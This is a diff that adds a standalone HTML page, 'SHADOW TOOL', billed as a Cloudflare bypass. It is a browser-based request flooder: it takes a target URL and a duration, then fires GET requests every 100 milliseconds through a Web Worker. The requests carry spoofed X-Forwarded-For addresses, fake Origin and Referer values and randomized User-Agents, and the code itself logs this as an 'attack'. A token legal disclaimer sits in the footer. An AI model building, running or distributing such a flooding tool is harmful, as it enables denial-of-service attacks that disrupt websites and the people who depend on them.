@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SHADOW TOOL | Advanced Request Generator</title>
+    <style>
+        :root {
+            --dark-bg: #0a0a0a;
+            --neon-green: #00ff9d;
+            --neon-blue: #00b8ff;
+            --text-light: #e0e0e0;
+            --text-dim: #888;
+            --panel-bg: #1a1a1a;
+            --panel-border: #333;
+        }
+        
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: var(--dark-bg);
+            color: var(--text-light);
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            border-bottom: 1px solid var(--neon-green);
+            padding-bottom: 15px;
+        }
+        
+        h1 {
+            color: var(--neon-green);
+            font-size: 2.5rem;
+            margin: 0;
+            text-shadow: 0 0 10px rgba(0, 255, 157, 0.3);
+        }
+        
+        .subtitle {
+            color: var(--text-dim);
+            font-size: 0.9rem;
+            margin-top: 5px;
+        }
+        
+        .panel {
+            background: var(--panel-bg);
+            border: 1px solid var(--panel-border);
+            border-radius: 5px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: var(--neon-blue);
+            font-weight: bold;
+        }
+        
+        input {
+            width: 100%;
+            padding: 10px;
+            background: #222;
+            border: 1px solid #444;
+            color: var(--text-light);
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+        }
+        
+        button {
+            background: linear-gradient(135deg, var(--neon-green), var(--neon-blue));
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+            margin-right: 10px;
+        }
+        
+        button:hover {
+            opacity: 0.8;
+            box-shadow: 0 0 10px rgba(0, 255, 157, 0.5);
+        }
+        
+        button:disabled {
+            background: #444;
+            color: #777;
+            cursor: not-allowed;
+        }
+        
+        #status {
+            padding: 10px;
+            border-radius: 3px;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+        
+        .success {
+            background: rgba(0, 255, 157, 0.1);
+            color: var(--neon-green);
+            border: 1px solid var(--neon-green);
+        }
+        
+        .error {
+            background: rgba(255, 0, 0, 0.1);
+            color: #ff5555;
+            border: 1px solid #ff5555;
+        }
+        
+        .info {
+            background: rgba(0, 184, 255, 0.1);
+            color: var(--neon-blue);
+            border: 1px solid var(--neon-blue);
+        }
+        
+        #console {
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 3px;
+            padding: 15px;
+            height: 300px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            color: var(--neon-green);
+            white-space: pre-wrap;
+        }
+        
+        .console-line {
+            margin-bottom: 5px;
+            line-height: 1.4;
+        }
+        
+        .timestamp {
+            color: var(--text-dim);
+        }
+        
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 15px;
+            color: var(--neon-blue);
+        }
+        
+        .stat-box {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 10px;
+            border-radius: 3px;
+            text-align: center;
+            flex: 1;
+            margin: 0 5px;
+        }
+        
+        .stat-value {
+            font-size: 1.5rem;
+            color: var(--neon-green);
+        }
+        
+        .stat-label {
+            font-size: 0.8rem;
+            color: var(--text-dim);
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            color: var(--text-dim);
+            font-size: 0.8rem;
+            border-top: 1px solid #333;
+            padding-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>SHADOW TOOL</h1>
+            <div class="subtitle">Advanced Cloudflare Bypass Tool</div>
+        </header>
+        
+        <div class="panel">
+            <div class="form-group">
+                <label for="url">TARGET URL:</label>
+                <input type="text" id="url" placeholder="https://example.com">
+            </div>
+            
+            <div class="form-group">
+                <label for="time">DURATION (SECONDS):</label>
+                <input type="number" id="time" placeholder="60">
+            </div>
+            
+            <button id="startBtn">START</button>
+            <button id="stopBtn" disabled>STOP</button>
+            
+            <div id="status" class="info">READY</div>
+        </div>
+        
+        <div class="panel">
+            <div class="stats">
+                <div class="stat-box">
+                    <div class="stat-value" id="reqCount">0</div>
+                    <div class="stat-label">REQUESTS</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="successCount">0</div>
+                    <div class="stat-label">SUCCESS</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="errorCount">0</div>
+                    <div class="stat-label">ERRORS</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="panel">
+            <h3>CONSOLE OUTPUT</h3>
+            <div id="console"></div>
+        </div>
+        
+        <footer>
+            <strong>⚠ LEGAL DISCLAIMER:</strong> Use only on authorized systems. Unauthorized testing is illegal.
+        </footer>
+    </div>
+
+    <script>
+        // DOM elements
+        const urlInput = document.getElementById('url');
+        const timeInput = document.getElementById('time');
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const statusDiv = document.getElementById('status');
+        const consoleDiv = document.getElementById('console');
+        const reqCountEl = document.getElementById('reqCount');
+        const successCountEl = document.getElementById('successCount');
+        const errorCountEl = document.getElementById('errorCount');
+
+        // Variables
+        let attackInterval;
+        let isRunning = false;
+        let requestCount = 0;
+        let successCount = 0;
+        let errorCount = 0;
+        let worker;
+
+        // Helper functions
+        function log(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            const line = document.createElement('div');
+            line.className = 'console-line';
+            line.innerHTML = '<span class="timestamp">[' + timestamp + ']</span> ' + message;
+            
+            if (type === 'error') line.style.color = '#ff5555';
+            else if (type === 'success') line.style.color = '#00ff9d';
+            
+            consoleDiv.appendChild(line);
+            consoleDiv.scrollTop = consoleDiv.scrollHeight;
+            
+            if (type === 'error') {
+                statusDiv.className = 'error';
+                statusDiv.textContent = 'ERROR: ' + message;
+            }
+        }
+
+        function updateStatus() {
+            reqCountEl.textContent = requestCount;
+            successCountEl.textContent = successCount;
+            errorCountEl.textContent = errorCount;
+            
+            statusDiv.className = 'info';
+            statusDiv.textContent = 'RUNNING | REQUESTS: ' + requestCount + ' | SUCCESS: ' + successCount + ' | ERRORS: ' + errorCount;
+        }
+
+        function randomByte() {
+            return Math.round(Math.random() * 256);
+        }
+
+        function randomString(length) {
+            const chars = 'abcdefghijklmnopqstuvwxyz0123456789';
+            let result = '';
+            for (let i = 0; i < length; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+
+        // Cloudflare bypass implementation
+        function startCloudflareBypass(url, duration) {
+            // Create a Web Worker to handle the bypass in the background
+            if (typeof(Worker) !== "undefined") {
+                if (typeof(worker) == "undefined") {
+                    const workerCode = `
+                        let attackInterval;
+                        let requestCount = 0;
+                        let successCount = 0;
+                        let errorCount = 0;
+                        
+                        function randomByte() {
+                            return Math.round(Math.random()*256);
+                        }
+                        
+                        function randomString(length) {
+                            const chars = 'abcdefghijklmnopqstuvwxyz0123456789';
+                            let result = '';
+                            for (let i = 0; i < length; i++) {
+                                result += chars.charAt(Math.floor(Math.random() * chars.length));
+                            }
+                            return result;
+                        }
+                        
+                        function sendRequest(url) {
+                            requestCount++;
+                            
+                            const rand = randomString(10);
+                            const ip = randomByte() + '.' + randomByte() + '.' + randomByte() + '.' + randomByte();
+                            
+                            const headers = {
+                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + (Math.floor(Math.random() * 30) + 90) + '.0.0.0 Safari/537.36',
+                                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+                                'Upgrade-Insecure-Requests': '2000',
+                                'Origin': 'http://' + rand + '.com',
+                                'Referer': 'http://google.com/' + rand,
+                                'X-Forwarded-For': ip
+                            };
+                            
+                            fetch(url, {
+                                method: 'GET',
+                                headers: headers,
+                                mode: 'no-cors',
+                                cache: 'no-store'
+                            })
+                            .then(response => {
+                                successCount++;
+                                postMessage({type: 'success', count: requestCount, success: successCount, error: errorCount});
+                            })
+                            .catch(error => {
+                                errorCount++;
+                                postMessage({type: 'error', count: requestCount, success: successCount, error: errorCount, message: error.message});
+                            });
+                        }
+                        
+                        self.onmessage = function(e) {
+                            if (e.data.command === 'start') {
+                                const url = e.data.url;
+                                const duration = e.data.duration;
+                                
+                                attackInterval = setInterval(function() {
+                                    sendRequest(url);
+                                }, 100);
+                                
+                                setTimeout(function() {
+                                    clearInterval(attackInterval);
+                                    postMessage({type: 'complete', count: requestCount, success: successCount, error: errorCount});
+                                }, duration * 1000);
+                            }
+                            else if (e.data.command === 'stop') {
+                                clearInterval(attackInterval);
+                                postMessage({type: 'stopped', count: requestCount, success: successCount, error: errorCount});
+                            }
+                        };
+                    `;
+                    
+                    const blob = new Blob([workerCode], {type: 'application/javascript'});
+                    worker = new Worker(URL.createObjectURL(blob));
+                    
+                    worker.onmessage = function(e) {
+                        const data = e.data;
+                        requestCount = data.count;
+                        successCount = data.success;
+                        errorCount = data.error;
+                        
+                        updateStatus();
+                        
+                        if (data.type === 'success') {
+                            log('Request #' + data.count + ' sent successfully', 'success');
+                        }
+                        else if (data.type === 'error') {
+                            log('Request #' + data.count + ' failed: ' + data.message, 'error');
+                        }
+                        else if (data.type === 'complete') {
+                            stopAttack();
+                            log('Attack completed after ' + timeInput.value + ' seconds. Total requests: ' + data.count);
+                            statusDiv.className = 'success';
+                            statusDiv.textContent = 'COMPLETED | TOTAL REQUESTS: ' + data.count;
+                        }
+                        else if (data.type === 'stopped') {
+                            log('Attack stopped manually. Total requests: ' + data.count);
+                            statusDiv.className = 'info';
+                            statusDiv.textContent = 'STOPPED | TOTAL REQUESTS: ' + data.count;
+                        }
+                    };
+                    
+                    worker.postMessage({
+                        command: 'start',
+                        url: url,
+                        duration: duration
+                    });
+                }
+            } else {
+                log("Web Workers not supported in your browser. Using simpler method...", 'error');
+                
+                // Fallback to simpler method if Web Workers aren't supported
+                attackInterval = setInterval(function() {
+                    const rand = randomString(10);
+                    const ip = randomByte() + '.' + randomByte() + '.' + randomByte() + '.' + randomByte();
+                    
+                    const headers = {
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + (Math.floor(Math.random() * 30) + 90) + '.0.0.0 Safari/537.36',
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+                        'Upgrade-Insecure-Requests': '2000',
+                        'Origin': 'http://' + rand + '.com',
+                        'Referer': 'http://google.com/' + rand,
+                        'X-Forwarded-For': ip
+                    };
+                    
+                    requestCount++;
+                    updateStatus();
+                    
+                    fetch(url, {
+                        method: 'GET',
+                        headers: headers,
+                        mode: 'no-cors',
+                        cache: 'no-store'
+                    })
+                    .then(function(response) {
+                        successCount++;
+                        updateStatus();
+                        log('Request #' + requestCount + ' sent successfully', 'success');
+                    })
+                    .catch(function(error) {
+                        errorCount++;
+                        updateStatus();
+                        log('Request #' + requestCount + ' failed: ' + error.message, 'error');
+                    });
+                }, 100);
+                
+                setTimeout(function() {
+                    if (isRunning) {
+                        stopAttack();
+                        log('Attack completed after ' + duration + ' seconds');
+                    }
+                }, duration * 1000);
+            }
+        }
+
+        // Event listeners
+        startBtn.addEventListener('click', function() {
+            if (!urlInput.value) {
+                log('Please enter a target URL', 'error');
+                return;
+            }
+
+            const duration = parseInt(timeInput.value) || 60;
+            isRunning = true;
+            startBtn.disabled = true;
+            stopBtn.disabled = false;
+            
+            log('Starting Cloudflare bypass attack on ' + urlInput.value + ' for ' + duration + ' seconds');
+            
+            // Start the attack
+            startCloudflareBypass(urlInput.value, duration);
+        });
+
+        stopBtn.addEventListener('click', stopAttack);
+
+        function stopAttack() {
+            if (worker) {
+                worker.postMessage({command: 'stop'});
+                worker.terminate();
+                worker = undefined;
+            }
+            
+            if (attackInterval) {
+                clearInterval(attackInterval);
+                attackInterval = null;
+            }
+            
+            isRunning = false;
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+        }
+
+        // Error handling
+        window.addEventListener('error', function(event) {
+            log('Uncaught error: ' + event.message, 'error');
+        });
+
+        window.addEventListener('unhandledrejection', function(event) {
+            log('Unhandled rejection: ' + event.reason, 'error');
+        });
+    </script>
+</body>
+</html>
